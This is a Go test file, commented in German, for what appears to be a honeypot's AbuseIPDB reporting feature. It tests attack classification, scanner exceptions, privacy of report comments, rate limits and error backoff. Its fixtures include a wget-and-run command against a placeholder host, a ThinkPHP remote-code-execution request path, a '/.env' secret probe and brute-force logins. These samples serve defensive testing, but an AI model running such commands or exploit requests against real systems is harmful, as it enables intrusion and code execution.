package main

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"
)

func sshBrute(ip string) []*Event {
	var evs []*Event
	for _, pw := range []string{"geheim123", "admin"} {
		e := loginEv("ssh", "root", pw, nil)
		e.SrcIP = ip
		evs = append(evs, e)
	}
	return evs
}

func TestAbuseVerdict(t *testing.T) {
	setOwnNets(OwnNets{Private: true})
	cfg := defaultAbuseReport()
	a := attackOf(sshBrute("203.0.113.50")...)
	if cats, why := abuseVerdict(a, cfg); why != "" || !slices.Equal(cats, []int{catBrute, catSSH}) {
		t.Fatalf("SSH-Brute-Force: %v %q", cats, why)
	}
	a = attackOf(sshBrute("192.168.178.20")...)
	if _, why := abuseVerdict(a, cfg); why == "" {
		t.Fatal("private Adresse gemeldet")
	}
	snmp := loginEv("snmp", "community", "public", nil)
	snmp.SrcIP = "203.0.113.51"
	if _, why := abuseVerdict(attackOf(snmp), cfg); !strings.Contains(why, "UDP") {
		t.Fatalf("nur UDP: %q", why)
	}
	scan := attackOf(sshBrute("203.0.113.52")...)
	scan.ASOrg = "Censys, Inc."
	scan.finish()
	if _, why := abuseVerdict(scan, cfg); !strings.Contains(why, "Censys") {
		t.Fatalf("Forschungsscanner: %q", why)
	}
	// M3 (Audit 3): Ein User-Agent macht niemanden zum Forschungsscanner …
	ua := evAt(time.Time{}, "request", "http", "", 80, map[string]any{"path": "/", "method": "GET", "user_agent": "Mozilla/5.0 (compatible; Shodan; +https://www.shodan.io)"})
	ua.SrcIP = "203.0.113.53"
	fake := attackOf(append([]*Event{ua}, sshBrute("203.0.113.53")...)...)
	if fake.Scanner != "" {
		t.Fatalf("Scanner per User-Agent: %q", fake.Scanner)
	}
	if _, why := abuseVerdict(fake, cfg); why != "" {
		t.Fatalf("mit Scanner-User-Agent nicht gemeldet: %q", why)
	}
	// … und ein echter Vermesser, der Befehle ausführt, verliert die Ausnahme.
	cmd := svcCmd("telnet", "uname -a; wget http://203.0.113.9/x.sh; sh x.sh")
	cmd.SrcIP = "203.0.113.52"
	inv := attackOf(append(sshBrute("203.0.113.52"), cmd)...)
	inv.ASOrg = "Censys, Inc."
	inv.Scanner = ""
	inv.Services, inv.Ports, inv.Mitre = nil, nil, nil
	inv.finish()
	if inv.Scanner != "" || inv.Stufe < stufeBefehle {
		t.Fatalf("Ausnahme trotz Befehlen: %q Stufe %d", inv.Scanner, inv.Stufe)
	}
	if _, why := abuseVerdict(inv, cfg); strings.Contains(why, "Forschungsscanner") {
		t.Fatalf("Vermesser mit Befehlen ausgelassen: %q", why)
	}
	if _, why := abuseVerdict(attackOf(svcCmd("redis", "PING"), svcCmd("redis", "INFO")), cfg); why == "" {
		t.Fatal("Redis-Abfrage gemeldet")
	}
	web := evAt(time.Time{}, "request", "http", "", 80, map[string]any{"path": "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array", "method": "GET"})
	if cats, why := abuseVerdict(attackOf(web), cfg); why != "" || !slices.Contains(cats, catWebApp) {
		t.Fatalf("Web-Exploit: %v %q", cats, why)
	}
	env := evAt(time.Time{}, "request", "http", "", 80, map[string]any{"path": "/.env", "method": "GET"})
	if _, why := abuseVerdict(attackOf(env), cfg); why == "" {
		t.Fatal("reine Geheimnis-Suche ohne Einstellung gemeldet")
	}
	tel := loginEv("telnet", "sh", "/bin/busybox ABCD", nil)
	if cats, _ := abuseVerdict(attackOf(tel), cfg); !slices.Contains(cats, catIoT) {
		t.Fatalf("Telnet-Bot: %v", cats)
	}
}

func TestAbuseCommentPrivacy(t *testing.T) {
	evs := sshBrute("203.0.113.50")
	u := loginEv("ssh", "nas-backup01", "x", nil)
	evs = append(evs, u, svcCmd("ssh", "wget http://198.51.100.9/x.sh"))
	a := attackOf(evs...)
	c := abuseComment(a, []string{"nas-backup01"})
	for _, bad := range []string{"geheim123", "admin", "nas-backup01", "198.51.100.9", "203.0.113.50"} {
		if strings.Contains(c, bad) && bad != "admin" {
			t.Errorf("Kommentar enthält %q: %s", bad, c)
		}
	}
	if strings.Contains(c, "geheim") || !strings.Contains(c, "root") || len(c) > 1000 {
		t.Errorf("Kommentar: %s", c)
	}
}

func TestAbuseReportRound(t *testing.T) {
	setOwnNets(OwnNets{Private: true})
	var mu sync.Mutex
	var got []map[string]string
	status := 200
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		r.ParseForm()
		mu.Lock()
		got = append(got, map[string]string{"key": r.Header.Get("Key"), "ip": r.Form.Get("ip"), "categories": r.Form.Get("categories"),
			"comment": r.Form.Get("comment"), "path": r.URL.Path, "ts": r.Form.Get("timestamp")})
		st := status
		mu.Unlock()
		w.Header().Set("X-RateLimit-Limit", "1000")
		w.Header().Set("X-RateLimit-Remaining", "998")
		if st == 429 {
			w.Header().Set("Retry-After", "3600")
			w.WriteHeader(429)
			w.Write([]byte(`{"errors":[{"detail":"Daily rate limit of 1000 requests exceeded for this endpoint.","status":429}]}`))
			return
		}
		if st == 401 {
			w.WriteHeader(401)
			w.Write([]byte(`{"errors":[{"detail":"Authentication failed. Your API key is either missing, incorrect, or revoked.","status":401}]}`))
			return
		}
		w.Write([]byte(`{"data":{"ipAddress":"` + r.Form.Get("ip") + `","abuseConfidenceScore":52}}`))
	}))
	defer srv.Close()
	old := abuseBase
	abuseBase = srv.URL
	t.Cleanup(func() { abuseBase = old })

	h := testHive(t)
	h.abuse.load(h.st)
	w, wait := testWriter(t, h.st)
	now := time.Now()
	for i, ip := range []string{"203.0.113.60", "203.0.113.61", "192.168.1.5"} {
		for _, e := range sshBrute(ip) {
			e.TS = now.Add(-time.Duration(10+i) * time.Second)
			w.Submit(e)
		}
	}
	snmp := evAt(now.Add(-5*time.Second), "login", "snmp", "203.0.113.62", 161, nil)
	snmp.Username, snmp.Password = "community", "public"
	w.Submit(snmp)
	wait()
	x := h.Extras()
	x.AbuseIPDBKey = "testschluessel"
	x.AbuseReport.Enabled = true
	h.extras.x = x
	ctx := context.Background()

	// Verzögerung (Standard 15 Minuten): die Angriffe sind Sekunden alt, also warten beide
	h.abuseRound(ctx)
	if w := h.share.waitList("abuseipdb"); len(h.abuse.log) != 0 || len(w) != 2 || !strings.HasPrefix(w[0].Detail, "wartet bis ") {
		t.Fatalf("Verzögerung: Protokoll %+v, wartet %+v", h.abuse.log, w)
	}
	x.ReportDelayMin = 0
	h.extras.x = x

	// Probemodus: nichts senden, aber protokollieren
	h.abuseRound(ctx)
	if len(got) != 0 {
		t.Fatalf("Probemodus hat gesendet: %v", got)
	}
	if n := len(h.abuse.log); n != 2 || h.abuse.log[0].Status != "dry" {
		t.Fatalf("Probemodus-Protokoll: %+v", h.abuse.log)
	}

	// Echte Meldung, Tageslimit 1
	x.AbuseReport.DryRun, x.AbuseReport.DailyLimit = false, 1
	h.extras.x = x
	h.abuseRound(ctx)
	if len(got) != 1 || got[0]["key"] != "testschluessel" || got[0]["path"] != "/api/v2/report" || got[0]["categories"] != "18,22" || got[0]["ts"] == "" {
		t.Fatalf("Meldung: %+v", got)
	}
	if strings.Contains(got[0]["comment"], "geheim123") {
		t.Fatal("Passwort im Kommentar")
	}
	if h.abuse.remaining != 998 || h.abuse.limit != 1000 {
		t.Fatalf("Kontingent nicht gelesen: %d/%d", h.abuse.remaining, h.abuse.limit)
	}
	// Abstand je IP: dieselbe IP nicht noch einmal; Tageslimit erreicht
	x.AbuseReport.DailyLimit = 10
	h.extras.x = x
	h.abuseRound(ctx)
	if len(got) != 2 || got[1]["ip"] == got[0]["ip"] {
		t.Fatalf("zweite Runde: %+v", got)
	}
	h.abuseRound(ctx)
	if len(got) != 2 {
		t.Fatalf("IP doppelt gemeldet: %d", len(got))
	}

	// 429: Pause, Fehler sichtbar
	h.st.db.Exec(`DELETE FROM lookups`)
	status = 429
	h.abuseRound(ctx)
	if len(got) != 3 || h.abuse.lastErr == "" || !time.Now().Before(h.abuse.pauseUntil) {
		t.Fatalf("429: %d Aufrufe, Fehler %q", len(got), h.abuse.lastErr)
	}
	h.abuseRound(ctx)
	if len(got) != 3 {
		t.Fatal("trotz Pause gemeldet")
	}
	rec := httptest.NewRecorder()
	h.abuseLog(rec, httptest.NewRequest("GET", "/api/abuse/log", nil))
	var lg struct {
		Log       []abuseLogEntry
		LastError string `json:"last_error"`
		Sent24h   int    `json:"sent_24h"`
	}
	json.Unmarshal(rec.Body.Bytes(), &lg)
	if lg.Sent24h != 2 || lg.LastError == "" || len(lg.Log) < 4 {
		t.Fatalf("Protokoll-API: %+v", lg)
	}

	// Abgelehnter Schlüssel (401): nach der ersten Ablehnung warten, nicht jede weitere IP dagegen schicken
	h.st.db.Exec(`DELETE FROM lookups`)
	h.abuse.mu.Lock()
	h.abuse.pauseUntil = time.Time{}
	h.abuse.mu.Unlock()
	mu.Lock()
	status = 401
	before := len(got)
	mu.Unlock()
	h.abuseRound(ctx)
	h.abuseRound(ctx)
	mu.Lock()
	sent := len(got) - before
	mu.Unlock()
	if sent != 1 || !time.Now().Add(30*time.Minute).Before(h.abuse.pauseUntil) {
		t.Fatalf("401: %d Aufrufe (erwartet 1), Pause bis %v", sent, h.abuse.pauseUntil)
	}
}
